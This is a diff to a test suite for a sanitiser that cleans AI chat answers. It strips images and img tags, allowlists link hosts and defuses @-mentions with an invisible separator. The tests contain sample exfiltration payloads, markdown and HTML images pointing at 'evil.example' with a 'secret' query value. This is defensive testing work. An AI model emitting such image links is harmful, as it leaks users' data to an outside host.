@@ -186,30 +186,30 @@ describe('cleanChatAnswer', () => {
       cleanChatAnswer('```\nx <!-- lumo-security:chat-answer --> y\n```')
     ).not.toContain('lumo-security')
   })
-  it('no image or tag renders outside code; links only to allowlisted hosts', () => {
+  it('no image or tag renders; links only to allowlisted hosts', () => {
     const out = cleanChatAnswer(
-      'See ![x](https://evil.example/?d=secret) and <img src="https://evil.example/a"> or [docs](https://example.com) and [gh](https://github.com/o/r).\n```\n![keep](in-code)\n```'
+      'See ![x](https://evil.example/?d=secret) and <img src="https://evil.example/a"> or [docs](https://example.com) and [gh](https://github.com/o/r).\n```\n![in](code)\n```'
     )!
-    expect(out).not.toMatch(/!\[x\]\(/)
+    expect(out).not.toContain('![')
     expect(out).not.toContain('<img')
-    expect(out).toContain('[docs]&#40;https://example.com)')
+    expect(out).not.toContain('[docs](')
+    expect(out).not.toContain('https://example.com')
+    expect(out.replace(/\u2060/g, '')).toContain('https://example.com')
     expect(out).toContain('[gh](https://github.com/o/r)')
-    expect(out).toContain('![keep](in-code)')
   })
-  it('keeps generics and other angle brackets in code and prose', () => {
-    const out = cleanChatAnswer(
+  it('code and generics read as written once the invisible separator is dropped', () => {
+    const raw =
       'Return `Map<string, number>`:\n```ts\nconst xs: Array<string> = []\n```'
-    )!
-    expect(out).toContain('`Map<string, number>`')
-    expect(out).toContain('const xs: Array<string> = []')
+    expect(cleanChatAnswer(raw)!.replace(/\u2060/g, '')).toBe(raw)
   })
-  it('defuses mentions outside code, keeps them inside', () => {
+  it('defuses every mention, code included (nobody is pinged)', () => {
     const out = cleanChatAnswer(
       'Ask @alice. Use `@Injectable` here:\n```ts\n@Component()\n```'
     )!
-    expect(out).toContain('@\u2060alice')
-    expect(out).toContain('`@Injectable`')
-    expect(out).toContain('\n@Component()\n')
+    expect(out).not.toMatch(/@[A-Za-z]/)
+    expect(out.replace(/\u2060/g, '')).toBe(
+      'Ask @alice. Use `@Injectable` here:\n```ts\n@Component()\n```'
+    )
   })
   it('a cut inside a code block closes the fence', () => {
     const out = cleanChatAnswer(`See:\n\`\`\`ts\n${'x'.repeat(10_000)}`)!
